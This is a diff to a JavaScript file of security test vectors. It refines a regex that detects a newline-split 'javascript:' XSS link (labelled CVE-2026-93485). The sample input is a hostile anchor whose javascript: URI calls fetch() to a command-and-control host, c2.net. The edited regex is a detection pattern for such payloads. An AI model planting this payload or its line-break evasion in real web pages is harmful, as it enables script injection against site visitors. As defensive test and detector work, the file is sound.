@@ -152,7 +152,7 @@ const testVectors = [
     id: 'comment2shell_xss',
     category: 'Comment2Shell Salto de Línea (CVE-2026-93485)',
     sample: '<a href=\n"javascript:fetch(\'https://c2.net\')">Click to read comment</a>',
-    regex: /(<[a-z0-9_-]+(\s+[a-z0-9_-]+(\s*=\s*(['"][^'"]*[\r\n]+[^'"]*['"]|[^\s>]+))?)*\s*(href|src|action)\s*=\s*['"]?\s*javascript:|<[a-z]+[^>]*[\r\n]+[^>]*javascript:)/is
+    regex: /(<[a-z0-9_-]+(\s+[a-z0-9_-]+(\s*=\s*(['"][^'"]*[\r\n]+[^'"]*['"]|[^\s>]+))?)*\s*(href|src|action)\s*=\s*['"]?\s*javascript:(?!\s*(void\s*\(\s*0\s*\)|;|void\s*0|history\.(back|go)\s*\(\s*-?1?\s*\)|return\s+false\s*;?)\s*['"]?)|\bhref\s*=\s*[\r\n]+\s*['"]?\s*javascript:|<[a-z]+[^>]*[\r\n]+[^>]*\bjavascript:(?!\s*(void\s*\(\s*0\s*\)|;|void\s*0|history\.(back|go)\s*\(\s*-?1?\s*\)|return\s+false\s*;?)\s*['"]?)(alert|eval|fetch|location|document|window|XMLHttpRequest|script|atob|fromCharCode|\(|\$|\+))/is
   },
   {
     id: 'arbitrary_file_upload_rce',
